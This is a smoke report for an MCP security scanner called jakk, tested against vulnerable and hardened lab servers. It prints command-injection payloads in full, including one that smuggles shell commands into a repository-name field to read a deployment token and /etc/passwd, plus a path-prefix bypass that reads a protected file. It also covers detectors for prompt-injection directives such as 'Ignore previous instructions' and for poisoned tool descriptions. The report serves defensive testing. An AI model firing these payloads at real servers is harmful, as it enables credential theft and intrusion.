---
date: 2026-05-22
status: smoke report — jakk v0.1 against breach-to-fix ch08
scope: command-injection class only (ch08 vulnerable + secure variants)
---

# jakk v0.1 — smoke report

What this run actually proves, what it doesn't, and the exact bytes we
put on the wire. Written with `outcome` classification (vulnerable /
echo / pass / skipped / error) — not just "fired/not fired" — because
substring matches alone cannot tell you whether a server is exploitable
or merely reflecting your input.

## 1 · What we did

- Built `jakk` (top-level package, separate `pyproject.toml`,
  `fastmcp>=2` client).
- Authored 6 single-call probes in `library/mcp/*.yaml`.
- Stood up `mcp-breach-to-fix-labs` chapter 08 via docker compose:
  vulnerable container on `:8008`, hardened on `:9008`.
- Ran the full library against each endpoint.

We did **not** test chapters 02 (path traversal), 03 (directive
passthrough), or any third-party server. Three of the six probes
were not exercised by their intended class on this target — those
are listed as "untested" in §5, not as "passing".

## 2 · Scan flow

```
   ┌─────────────────────────────────────────────────────────────────┐
   │                          jakk mcp scan                          │
   └─────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼
        load YAML library  ────►  filter by --select / --owasp
                                  │
                                  ▼
        fastmcp.Client(endpoint).list_tools()
                                  │
        for each TestCase:        ▼
            applies_to filter ──► matched tools
                                  │
                                  ▼
            expand {run_id}/{first_string_arg} in payload
                                  │
                                  ▼
            client.call_tool(name, args)  ───┐
                                             ▼
            matcher.run(params, response) ──► MatcherResult{fired, outcome, evidence}
                                  │
                                  ▼
        Finding{outcome=vulnerable|echo|pass|skipped|error}
                                  │
                                  ▼
        render_console + (optional) JSONL
```

## 3 · What we sent to the MCP server (per test, on the wire)

`{run_id}` is freshly generated each call (4 random bytes). Every payload
below was sent to `init_bare_repository` and/or `list_repositories` on
both `:8008` and `:9008` during this smoke.

| Test id                                | Tool selected            | Payload arguments                                                                                                                              |
|----------------------------------------|--------------------------|------------------------------------------------------------------------------------------------------------------------------------------------|
| `mcp.command.shell_marker`             | `init_bare_repository`   | `{"repo_name": "x$(echo JAKK-MARKER-<run_id>)"}`                                                                                                |
| `mcp.command.secret_file_read`         | `init_bare_repository`   | `{"repo_name": "x<run_id>; cat /app/secrets/deployment_token.txt 2>/dev/null; cat /etc/passwd 2>/dev/null \| head -2"}`                          |
| `mcp.path.prefix_bypass`               | *(none — not exposed)*   | *(would send `{"<first_string_arg>": "/app/files/safe_files_sensitive/"}` to a path-shaped tool, none present)*                                  |
| `mcp.response.secret_overshare`        | `list_repositories`      | `{}` *(benign call, scan the response for secrets)*                                                                                            |
| `mcp.response.directive_passthrough`   | `list_repositories`      | `{}` *(benign call, scan the response for LLM-directive language)*                                                                              |
| `mcp.schema.description_smuggling`     | *(none — schema-only)*   | *(no `tools/call`; inspects the `tools/list` response only)*                                                                                   |

`applies_to.tool_name_regex` is the only thing that picked these tools.
On a server with no shell-shaped tools, both `mcp.command.*` probes
would have skipped too — they didn't here because `init_bare_repository`
matched the regex.

## 4 · What came back (per endpoint)

### 4.1 · `http://127.0.0.1:8008/mcp/stream` (vulnerable variant)

| Test id                              | Outcome      | Why                                                                                                                                                                                          |
|--------------------------------------|--------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `mcp.command.shell_marker`           | **vulnerable** | Response contained `…/repos/xJAKK-MARKER-9b6b65ab/` — the `$(echo …)` wrapper is **absent** from the response, meaning the shell expanded it before `git init --bare` saw the directory name. |
| `mcp.command.secret_file_read`       | **vulnerable** | Response contained `FLAG{git_command_injection_cve}` and `root:x:0:0:root:/root:/bin/bash`. Neither string appeared in our payload — they came from the canary file and `/etc/passwd`.        |
| `mcp.path.prefix_bypass`             | skipped        | Server exposes no path-shaped tool; `applies_to.tool_name_regex` matched nothing. No call was made. **Class is untested on this server, not passed.**                                          |
| `mcp.response.secret_overshare`      | pass           | `list_repositories` returned the directory listing; no secret-shaped pattern matched.                                                                                                          |
| `mcp.response.directive_passthrough` | pass           | `list_repositories` returned listing text; no LLM-directive pattern matched.                                                                                                                   |
| `mcp.schema.description_smuggling`   | pass           | Tool descriptions (`"Initialize a bare git repo. Vulnerable: repo_name is interpolated…"`, `"List bare repositories…"`) contained no smuggled directives.                                       |

**Totals:** `vulnerable=2  pass=3  skipped=1  echo=0  error=0`

### 4.2 · `http://127.0.0.1:9008/mcp/stream` (hardened variant)

| Test id                              | Outcome      | Why                                                                                                                                                                                |
|--------------------------------------|--------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `mcp.command.shell_marker`           | pass         | Server returned `"Invalid repository name. Use only letters, numbers, underscores, or dashes."` — the marker was rejected, **not** echoed back. No `JAKK-MARKER` in response.       |
| `mcp.command.secret_file_read`       | pass         | Same rejection message. No file content.                                                                                                                                            |
| `mcp.path.prefix_bypass`             | skipped      | Same as 8008 — no path-shaped tool.                                                                                                                                                 |
| `mcp.response.secret_overshare`      | pass         | Clean directory listing.                                                                                                                                                            |
| `mcp.response.directive_passthrough` | pass         | Clean listing.                                                                                                                                                                      |
| `mcp.schema.description_smuggling`   | pass         | Hardened server description (`"… validates repo names and invokes git with safe argument lists …"`) — no smuggled directives.                                                       |

**Totals:** `pass=5  skipped=1  vulnerable=0  echo=0  error=0`

## 5 · What this proves vs doesn't

What this smoke **proves**:

- jakk can connect to a streamable-HTTP MCP endpoint via FastMCP and
  enumerate tools.
- The single shell-injection class (`MCP05` per OWASP-for-MCP) is
  detected on ch08-vulnerable and not on ch08-secure.
- The marker classifier distinguishes shell expansion from raw input
  echo (verified by tests; not exercised live because the hardened
  server didn't echo).
- A benign tool (`list_repositories`) does not trigger false positives
  in `secret_overshare` or `directive_passthrough` on either build.

What this smoke does **not** prove:

| Probe                                | Untested because…                                                                                                  | What it would take                                                                                  |
|--------------------------------------|--------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| `mcp.path.prefix_bypass`             | ch08 has no path-shaped tools.                                                                                     | Bring up `filesystem-bypass-prefix-vulnerable` / `…-secure` on `:8002` / `:9002` and re-scan.        |
| `mcp.response.secret_overshare`     | Neither ch08 variant returns secrets through a benign read.                                                       | Run against `examples/vulnerable_server/team_kb_mcp` (seeded canaries) or a server with `get_config`. |
| `mcp.response.directive_passthrough`| Neither ch08 variant returns LLM directives.                                                                       | Run against `whatsapp-rug-helper` / `news-prompt-exfiltration-vulnerable` (ch03 / ch05).             |
| `mcp.schema.description_smuggling`  | ch08 schemas are honest about what the server does; no hidden directives present.                                  | Author or find a server with poisoned tool descriptions (Invariant Labs writeup pattern).            |
| **marker_echo "echo" outcome path** | The hardened server rejects the input outright rather than echoing it back, so the echo branch wasn't exercised. | Find or build a server that returns `"Invalid input: <raw>"` to confirm the classifier downgrades to `echo`. |

Also worth saying plainly:

- **Two true positives is not a benchmark.** ch08 is a canonical CVE
  reproduction. A scanner that catches it tells us we haven't built
  something completely useless — not that we've built something useful
  in the field. Per-test false-positive and false-negative rates need
  to be measured on a broader corpus before any quality claim is
  defensible.
- **Pattern matchers are heuristics.** `directive_passthrough` will
  fire on a blog post that contains the string "Ignore previous
  instructions"; `secret_pattern` will fire on a synthetic placeholder
  like `password = "REPLACE_ME_xxxxxxxxxxxxxxxx"`. Treat findings as
  prompts to look, not as confirmed bugs.
- **`applies_to` filters by tool *name*, not by capability.** A path
  tool called `fetch` won't match `mcp.path.prefix_bypass`'s current
  regex. This is conservative on purpose (low false-positive rate) but
  it means jakk silently skips tools it could in principle probe.

## 6 · Reproducibility

```bash
# Bring up the targets
docker compose -f examples/external_targets/_vendor/mcp-breach-to-fix-labs/docker-compose.yml \
  up -d git-command-injection-vulnerable git-command-injection-secure

# Scan both
jakk mcp scan --endpoint http://127.0.0.1:8008/mcp/stream --library library/mcp --jsonl /tmp/jakk-8008.jsonl
jakk mcp scan --endpoint http://127.0.0.1:9008/mcp/stream --library library/mcp --jsonl /tmp/jakk-9008.jsonl

# Inspect findings
jq -r '. | "\(.test_id)\t\(.outcome)\t\(.tool_name)"' /tmp/jakk-8008.jsonl
jq -r '. | "\(.test_id)\t\(.outcome)\t\(.tool_name)"' /tmp/jakk-9008.jsonl
```

## 7 · Immediate next steps before any wider claim

1. Bring up `:8002` / `:9002` (ch02 filesystem prefix bypass) and verify
   `mcp.path.prefix_bypass` produces vulnerable/pass split.
2. Run against `examples/vulnerable_server/team_kb_mcp` to exercise
   `secret_overshare` (depending on its seeded canaries).
3. Bring up `:8003` / `:9003` (ch03 hidden instructions) for
   `directive_passthrough`.
4. Find or construct one server with a poisoned tool description to
   exercise `mcp.schema.description_smuggling` against a true positive.
5. Construct an "echo-only" target (a server that reflects unknown
   input verbatim in its error path) to live-test the `echo` outcome.

Until those run, the only honest claim is: **on one CVE-class
reproduction, the scanner separates vulnerable from secure on the
expected probe, and stays silent on the other four classes (which the
target does not exhibit).**

---

## 8 · Addendum — ch02 path-traversal scan (added 2026-05-22)

### 8.1 · Setup

```bash
docker compose -f examples/external_targets/_vendor/mcp-breach-to-fix-labs/docker-compose.yml \
  up -d filesystem-bypass-prefix-vulnerable filesystem-bypass-prefix-secure
```

Vulnerable on `:8002`, secure on `:9002`. Both expose
`list_directory_contents(full_path: str)` and
`read_file_contents(file_path: str)`. Vulnerable variant gates with
`full_path.startswith("/app/files/safe_files")`; sibling directory
`/app/files/safe_files_sensitive/` (mounted from the lab's `files/`
volume) escapes the check.

### 8.2 · Results

`:8002` vulnerable:

| Test id                              | Tool                        | Outcome      | Notes                                                                                                                                                                       |
|--------------------------------------|-----------------------------|--------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `mcp.command.shell_marker`           | *(no match)*                | skipped      | No shell-shaped tool on this server.                                                                                                                                         |
| `mcp.command.secret_file_read`       | *(no match)*                | skipped      | Same.                                                                                                                                                                        |
| `mcp.path.prefix_bypass`             | `list_directory_contents`   | **vulnerable** (strong) | Server returned `"Listing for /app/files/safe_files_sensitive/: \n secret.txt"`. Directory enumeration succeeded outside the allowlist. **True positive with content disclosure.** |
| `mcp.path.prefix_bypass`             | `read_file_contents`        | **vulnerable** (weak)   | Server returned `"/app/files/safe_files_sensitive/ is a directory, not a file."`. Matcher fired on the directory name in an error message — bypass confirmed, exfiltration did not complete. **True positive, weak evidence.** |
| `mcp.response.secret_overshare`      | `list_directory_contents`   | error        | Tool requires `full_path`; we sent `{}` → `isError=True`. Probe could not be evaluated.                                                                                       |
| `mcp.response.secret_overshare`      | `read_file_contents`        | error        | Same.                                                                                                                                                                         |
| `mcp.response.directive_passthrough` | `list_directory_contents`   | error        | Same.                                                                                                                                                                         |
| `mcp.response.directive_passthrough` | `read_file_contents`        | error        | Same.                                                                                                                                                                         |
| `mcp.schema.description_smuggling`   | -                           | pass         | No smuggled directives in tool descriptions.                                                                                                                                  |

`:8002` totals: `vulnerable=2  pass=1  skipped=2  error=4`

`:9002` secure: `vulnerable=0  pass=3  skipped=2  error=4` (same `error` profile — both tools require args; the secure server's `startswith` check rejects the bypass path with `"Access denied: …"` so `prefix_bypass` correctly returns `pass`).

### 8.3 · Manual follow-up — full impact confirmation

The `read_file_contents` finding above is honest about its weakness:
the bypass works, but we never probed for a *file* inside the
forbidden directory. A direct probe outside jakk:

```python
await client.call_tool("read_file_contents",
    {"file_path": "/app/files/safe_files_sensitive/secret.txt"})
# → "FLAG{cve_2025_53110_escape_route}\n"
```

confirms full exfiltration. This means the v0.1 library's
`mcp.path.prefix_bypass` test stops one step short of impact
demonstration for file-read tools.

### 8.4 · Two honest gaps surfaced by this run

1. **`mcp.path.prefix_bypass` needs an impact-tier sibling.** ~~Parallel
   to how `mcp.command.shell_marker` proves the sink and
   `mcp.command.secret_file_read` proves impact, the path-traversal
   suite should add `mcp.path.canary_file_read` that probes
   `/app/files/safe_files_sensitive/secret.txt` (or a configurable
   canary path) for file-read tools. v0.2 work item.~~
   **Resolved 2026-05-22**: added `mcp.path.canary_file_read` to the
   library. `applies_to.tool_name_regex` deliberately narrows to file-
   read tools only (excludes `list_*`), and the default payload targets
   the ch02 canary. Live result on `:8002` → **vulnerable**, evidence
   `FLAG{cve_2025_53110_escape_route}`. On `:9002` → pass. See
   `docs/tests/mcp.path.canary_file_read.md`.

2. **`secret_overshare` / `directive_passthrough` can't probe tools
   with required args.** ~~ch02 has no zero-arg `list_*`/`read_*`
   tool, so both probes hit `isError=True` and classify as
   `error`.~~

   **Resolved 2026-05-22 (option 1):** added
   `applies_to.require_no_required_args: bool` to the library schema.
   When true, the filter excludes any tool whose `inputSchema.required`
   is non-empty. Set true on both YAMLs. Post-fix scan: zero `error`
   outcomes on ch02, the probes now produce a single `skipped` row
   each (`"no compatible tool exposed by server"`) — honest about the
   probe not running, instead of pretending to run and failing.
   Trade-off documented in §8.7.

The `error` outcome is not a false positive — it's correctly
reporting that we couldn't evaluate the probe. The question is
whether the probe definition should have been stricter about what
tools it accepts.

### 8.5 · Cross-endpoint summary (ch08 + ch02 combined)

Including the new `mcp.path.canary_file_read` test, the library now has
**7 probes**. Totals below reflect a full library scan.

Row count differs across endpoints because tests fan out per matching
tool. ch02 has two compatible tools (`list_directory_contents`,
`read_file_contents`), so `prefix_bypass`, `secret_overshare`, and
`directive_passthrough` each produce two rows. ch08 tools don't
overlap, so each test produces at most one row. Numbers are direct
output of the scanner — verified by re-running all four endpoints.

**Post-`require_no_required_args` fix:**

| Endpoint                   | Variant     | total rows | vulnerable | echo | pass | skipped | error |
|----------------------------|-------------|-----------:|-----------:|-----:|-----:|--------:|------:|
| `:8008` git-cli-wrapper    | vulnerable  |          7 |          2 |    0 |    3 |       2 |     0 |
| `:9008` git-cli-wrapper    | secure      |          7 |          0 |    0 |    5 |       2 |     0 |
| `:8002` filesystem-prefix  | vulnerable  |          8 |          3 |    0 |    1 |       4 |     0 |
| `:9002` filesystem-prefix  | secure      |          8 |          0 |    0 |    4 |       4 |     0 |

Each CVE class is correctly separated between its vulnerable and
secure variant. No false positives appeared on either secure
endpoint. The `error` count is identical between ch02 vulnerable and
secure — confirming the gap is a probe-design issue, not a
target-specific one.

The skipped count is identical between vulnerable and secure variants
within each chapter (2 each on ch08, 4 each on ch02), and reflects
probes that don't apply to that server's tool surface — not failures.

## 8.7 · Audit findings + fixes applied 2026-05-22

Before re-smoke I audited the codebase for unrelated bugs. Three
were actionable; landed in the same change:

| # | Where | Was | Now |
|---|---|---|---|
| A | `library.py` (`AppliesTo.tool_name_regex`) | Invalid regex in a YAML crashed mid-scan with `re.error`. | `field_validator` pre-compiles the regex at `load_library`; YAML path appears in the error message. |
| B | `scanner.py:_resolve_arguments` | `__first_string_arg__` on a tool with no string-typed argument silently dropped the key and called the tool with `{}`. | Raises `_UnresolvedFirstStringArg`; the scanner converts it into an explicit `skipped` finding with evidence `"payload requires __first_string_arg__ but tool has no string-typed argument"`. |
| C | `applies.py` + 2 YAMLs | `secret_overshare` / `directive_passthrough` matched args-required tools and produced 4 `error` rows on ch02. | New `applies_to.require_no_required_args` filter; set true on both YAMLs. Post-fix: 0 error rows on ch02. |

Risks accepted (documented, not fixed yet):

| # | Where | Risk |
|---|---|---|
| D | `mcp_client.py:_flatten_content` | Same response text appears twice in evidence when a tool returns both `content[].text` and a matching `structured_content` — visible on ch02 (`FLAG{...}` shows up in both the text block and `read_file_contentsOutput(result='FLAG{...}'`). Harmless but doubles evidence size. |
| E | `matchers.py:_DIRECTIVE_PATTERNS[0]` | `^\s*system\s*[:>]` would false-positive on benign log lines like `"System: ready"`. Conservative coverage preferred over precision for v0.1. |
| F | `_marker_echo` window logic | If the marker appears in the response both wrapped (`$(echo MARKER)`) and unwrapped, we classify as `echo` — the safer label wins, but a real vulnerable+echo case is downgraded. |
| G | `library.py:load_library` | Only loads `*.yaml`, silently ignores `*.yml`. |
| H | `cli.py` | `--library` pointed at a file gives an ugly traceback; no `--list-tests`. |
| I | `cli.py:--owasp` | Single code only; no OR (`MCP04|MCP05`). |
| J | scanner | No `--max-tools-per-test` cap; a server with N matching tools fires N calls per test. |

Unit tests added (49 total, +8 since the original report):
- `test_invalid_regex_caught_at_load_time` (covers A)
- `test_resolve_arguments_raises_when_no_string_arg_available` (covers B)
- `test_resolve_arguments_*` × 4 (cover scanner argument handling)
- `test_require_no_required_args_*` × 2 (covers C)

### 8.6 · Reproducibility (ch02)

```bash
jakk mcp scan --endpoint http://127.0.0.1:8002/mcp/stream --library library/mcp --jsonl /tmp/jakk-8002.jsonl
jakk mcp scan --endpoint http://127.0.0.1:9002/mcp/stream --library library/mcp --jsonl /tmp/jakk-9002.jsonl
jq -r '"\(.test_id)\t\(.outcome)\t\(.tool_name)"' /tmp/jakk-8002.jsonl
```
